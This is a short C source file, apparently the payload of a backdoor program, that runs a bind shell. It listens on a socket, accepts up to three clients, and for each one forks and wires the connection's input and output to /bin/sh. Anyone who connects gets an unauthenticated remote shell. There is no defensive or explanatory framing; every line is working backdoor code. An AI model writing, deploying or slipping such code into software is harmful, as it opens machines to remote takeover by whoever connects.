#include "payload.h"

int main(void) {
	int	  listener;
	int	  client;
	pid_t pid;

	listener = create_listener();
	if (listener < 0) {
		sd_notifyf(0, "STOPPING=1\nEXIT_STATUS=1\nERRNO=%d", errno);
		return (1);
	}
	setup_sigchld();
	while (42) {
		client = accept(listener, NULL, NULL);
		if (client < 0) {
			dprintf(STDERR_FILENO,
					SD_ERR
					"[file: %s][line %d][func %s] Failed accept new client",
					__FILE_NAME__, __LINE__, __PRETTY_FUNCTION__);
			sd_notifyf(0, "STOPPING=1\nEXIT_STATUS=1\nERRNO=%d", errno);
			return (1);
		}
		size_t seat;
		for (seat = 0; seat < 3; seat++) {
			if (client_seats[seat] == -1)
				break;
		}
		if (seat == 3) {
			dprintf(client, "error: no seats available\r\n");
			close(client);
			continue;
		}
		pid = fork();
		if (pid == 0) {
			dup2(client, STDIN_FILENO);
			dup2(client, STDOUT_FILENO);
			dup2(client, STDERR_FILENO);
			execl("/bin/sh", "sh", NULL);
		} else if (pid > 0) {
			client_seats[seat] = pid;
		}
		close(client); // avoid leak
	}
}
